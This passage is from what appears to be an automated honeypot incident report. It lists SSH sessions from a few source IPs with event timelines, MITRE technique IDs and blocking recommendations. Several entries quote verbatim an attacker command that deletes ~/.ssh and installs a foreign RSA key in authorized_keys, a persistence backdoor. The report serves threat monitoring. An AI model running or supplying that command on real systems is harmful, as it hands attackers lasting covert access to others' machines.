| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:35:23` | `cowrie.session.connect` |
| `2026-04-15 17:35:23` | `cowrie.client.version` |
| `2026-04-15 17:35:23` | `cowrie.client.kex` |
| `2026-04-15 17:35:23` | `cowrie.login.success` |
| `2026-04-15 17:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eca3832a05f

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:37 |
| **Last Seen** | 2026-04-15 17:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:37:17` | `cowrie.session.connect` |
| `2026-04-15 17:37:17` | `cowrie.client.version` |
| `2026-04-15 17:37:17` | `cowrie.client.kex` |
| `2026-04-15 17:37:18` | `cowrie.login.success` |
| `2026-04-15 17:37:18` | `cowrie.session.params` |
| `2026-04-15 17:37:18` | `cowrie.command.input` |
| `2026-04-15 17:37:18` | `cowrie.command.failed` |
| `2026-04-15 17:37:18` | `cowrie.log.closed` |
| `2026-04-15 17:37:18` | `cowrie.session.params` |
| `2026-04-15 17:37:18` | `cowrie.command.input` |
| `2026-04-15 17:37:18` | `cowrie.session.file_download` |
| `2026-04-15 17:37:18` | `cowrie.log.closed` |
| `2026-04-15 17:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5941718926fa

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:37 |
| **Last Seen** | 2026-04-15 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:37:19` | `cowrie.session.connect` |
| `2026-04-15 17:37:19` | `cowrie.client.version` |
| `2026-04-15 17:37:19` | `cowrie.client.kex` |
| `2026-04-15 17:37:20` | `cowrie.login.success` |
| `2026-04-15 17:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81015a4a5991

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:43 |
| **Last Seen** | 2026-04-15 17:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:43:08` | `cowrie.session.connect` |
| `2026-04-15 17:43:08` | `cowrie.client.version` |
| `2026-04-15 17:43:08` | `cowrie.client.kex` |
| `2026-04-15 17:43:08` | `cowrie.login.success` |
| `2026-04-15 17:43:09` | `cowrie.session.params` |
| `2026-04-15 17:43:09` | `cowrie.command.input` |
| `2026-04-15 17:43:09` | `cowrie.command.failed` |
| `2026-04-15 17:43:09` | `cowrie.log.closed` |
| `2026-04-15 17:43:09` | `cowrie.session.params` |
| `2026-04-15 17:43:09` | `cowrie.command.input` |
| `2026-04-15 17:43:09` | `cowrie.session.file_download` |
| `2026-04-15 17:43:09` | `cowrie.log.closed` |
| `2026-04-15 17:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e3305103551

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:43 |
| **Last Seen** | 2026-04-15 17:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:43:10` | `cowrie.session.connect` |
| `2026-04-15 17:43:10` | `cowrie.client.version` |
| `2026-04-15 17:43:10` | `cowrie.client.kex` |
| `2026-04-15 17:43:10` | `cowrie.login.success` |
| `2026-04-15 17:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f40d01743678

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:45 |
| **Last Seen** | 2026-04-15 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:45:01` | `cowrie.session.connect` |
| `2026-04-15 17:45:01` | `cowrie.client.version` |
| `2026-04-15 17:45:01` | `cowrie.client.kex` |
| `2026-04-15 17:45:01` | `cowrie.login.success` |
| `2026-04-15 17:45:01` | `cowrie.session.params` |
| `2026-04-15 17:45:01` | `cowrie.command.input` |
| `2026-04-15 17:45:01` | `cowrie.command.failed` |
| `2026-04-15 17:45:01` | `cowrie.log.closed` |
| `2026-04-15 17:45:01` | `cowrie.session.params` |
| `2026-04-15 17:45:01` | `cowrie.command.input` |
| `2026-04-15 17:45:01` | `cowrie.session.file_download` |
| `2026-04-15 17:45:01` | `cowrie.log.closed` |
| `2026-04-15 17:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-029bc7e99f57

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:45 |
| **Last Seen** | 2026-04-15 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:45:03` | `cowrie.session.connect` |
| `2026-04-15 17:45:03` | `cowrie.client.version` |
| `2026-04-15 17:45:03` | `cowrie.client.kex` |
| `2026-04-15 17:45:03` | `cowrie.login.success` |
| `2026-04-15 17:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc464d3d84b8

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:48 |
| **Last Seen** | 2026-04-15 17:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:48:37` | `cowrie.session.connect` |
| `2026-04-15 17:48:37` | `cowrie.client.version` |
| `2026-04-15 17:48:37` | `cowrie.client.kex` |
| `2026-04-15 17:48:37` | `cowrie.login.success` |
| `2026-04-15 17:48:37` | `cowrie.session.params` |
| `2026-04-15 17:48:37` | `cowrie.command.input` |
| `2026-04-15 17:48:37` | `cowrie.command.failed` |
| `2026-04-15 17:48:37` | `cowrie.log.closed` |
| `2026-04-15 17:48:37` | `cowrie.session.params` |
| `2026-04-15 17:48:37` | `cowrie.command.input` |
| `2026-04-15 17:48:37` | `cowrie.session.file_download` |
| `2026-04-15 17:48:37` | `cowrie.log.closed` |
| `2026-04-15 17:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-727ec7b2af6b

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:48 |
| **Last Seen** | 2026-04-15 17:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:48:39` | `cowrie.session.connect` |
| `2026-04-15 17:48:39` | `cowrie.client.version` |
| `2026-04-15 17:48:39` | `cowrie.client.kex` |
| `2026-04-15 17:48:39` | `cowrie.login.success` |
| `2026-04-15 17:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4684d4082b34

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:56 |
| **Last Seen** | 2026-04-15 17:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:56:06` | `cowrie.session.connect` |
| `2026-04-15 17:56:06` | `cowrie.client.version` |
| `2026-04-15 17:56:06` | `cowrie.client.kex` |
| `2026-04-15 17:56:06` | `cowrie.login.success` |
| `2026-04-15 17:56:06` | `cowrie.session.params` |
| `2026-04-15 17:56:06` | `cowrie.command.input` |
| `2026-04-15 17:56:06` | `cowrie.command.failed` |
| `2026-04-15 17:56:06` | `cowrie.log.closed` |
| `2026-04-15 17:56:06` | `cowrie.session.params` |
| `2026-04-15 17:56:06` | `cowrie.command.input` |
| `2026-04-15 17:56:06` | `cowrie.session.file_download` |
| `2026-04-15 17:56:06` | `cowrie.log.closed` |
| `2026-04-15 17:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eca4b3cbdda

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:56 |
| **Last Seen** | 2026-04-15 17:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:56:08` | `cowrie.session.connect` |
| `2026-04-15 17:56:08` | `cowrie.client.version` |
| `2026-04-15 17:56:08` | `cowrie.client.kex` |
| `2026-04-15 17:56:08` | `cowrie.login.success` |
| `2026-04-15 17:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6250b679e1b

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 18:01 |
| **Last Seen** | 2026-04-15 18:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 18:01:37` | `cowrie.session.connect` |
| `2026-04-15 18:01:37` | `cowrie.client.version` |
| `2026-04-15 18:01:37` | `cowrie.client.kex` |
| `2026-04-15 18:01:37` | `cowrie.login.success` |
| `2026-04-15 18:01:37` | `cowrie.session.params` |
| `2026-04-15 18:01:37` | `cowrie.command.input` |
| `2026-04-15 18:01:37` | `cowrie.command.failed` |
| `2026-04-15 18:01:37` | `cowrie.log.closed` |
| `2026-04-15 18:01:37` | `cowrie.session.params` |
| `2026-04-15 18:01:37` | `cowrie.command.input` |
| `2026-04-15 18:01:37` | `cowrie.session.file_download` |
| `2026-04-15 18:01:37` | `cowrie.log.closed` |
| `2026-04-15 18:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c8671ba8d02

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 18:01 |
| **Last Seen** | 2026-04-15 18:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 18:01:39` | `cowrie.session.connect` |
| `2026-04-15 18:01:39` | `cowrie.client.version` |
| `2026-04-15 18:01:39` | `cowrie.client.kex` |
| `2026-04-15 18:01:39` | `cowrie.login.success` |
| `2026-04-15 18:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcad985f2dda

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 18:03 |
| **Last Seen** | 2026-04-15 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 18:03:29` | `cowrie.session.connect` |
| `2026-04-15 18:03:29` | `cowrie.client.version` |
| `2026-04-15 18:03:29` | `cowrie.client.kex` |
| `2026-04-15 18:03:30` | `cowrie.login.success` |
| `2026-04-15 18:03:30` | `cowrie.session.params` |
| `2026-04-15 18:03:30` | `cowrie.command.input` |
| `2026-04-15 18:03:30` | `cowrie.command.failed` |
| `2026-04-15 18:03:30` | `cowrie.log.closed` |
| `2026-04-15 18:03:30` | `cowrie.session.params` |
| `2026-04-15 18:03:30` | `cowrie.command.input` |
| `2026-04-15 18:03:30` | `cowrie.session.file_download` |
| `2026-04-15 18:03:30` | `cowrie.log.closed` |
| `2026-04-15 18:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15f30527d45e

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 18:03 |
| **Last Seen** | 2026-04-15 18:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 18:03:31` | `cowrie.session.connect` |
| `2026-04-15 18:03:31` | `cowrie.client.version` |
| `2026-04-15 18:03:31` | `cowrie.client.kex` |
| `2026-04-15 18:03:31` | `cowrie.login.success` |
| `2026-04-15 18:03:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4faed618fe3e

| Field | Detail |
|---|---|
| **Source IP** | `119.96.158[.]238` |
| **First Seen** | 2026-04-15 18:59 |
| **Last Seen** | 2026-04-15 19:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 18:59:58` | `cowrie.session.connect` |
| `2026-04-15 18:59:58` | `cowrie.client.version` |
| `2026-04-15 18:59:58` | `cowrie.client.kex` |
| `2026-04-15 18:59:58` | `cowrie.login.success` |
| `2026-04-15 18:59:59` | `cowrie.session.params` |
| `2026-04-15 18:59:59` | `cowrie.command.input` |
| `2026-04-15 18:59:59` | `cowrie.command.failed` |
| `2026-04-15 18:59:59` | `cowrie.log.closed` |
| `2026-04-15 18:59:59` | `cowrie.session.params` |
| `2026-04-15 18:59:59` | `cowrie.command.input` |
| `2026-04-15 18:59:59` | `cowrie.session.file_download` |
| `2026-04-15 18:59:59` | `cowrie.log.closed` |
| `2026-04-15 19:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.158[.]238` to AbuseIPDB if not already reported
- [ ] Block `119.96.158[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79616fbd5650

| Field | Detail |
|---|---|
| **Source IP** | `119.96.158[.]238` |
| **First Seen** | 2026-04-15 19:00 |
| **Last Seen** | 2026-04-15 19:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:00:02` | `cowrie.session.connect` |
| `2026-04-15 19:00:02` | `cowrie.client.version` |
| `2026-04-15 19:00:02` | `cowrie.client.kex` |
| `2026-04-15 19:00:02` | `cowrie.login.success` |
| `2026-04-15 19:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.158[.]238` to AbuseIPDB if not already reported
- [ ] Block `119.96.158[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50ea3c916d72

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-15 19:04 |
| **Last Seen** | 2026-04-15 19:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
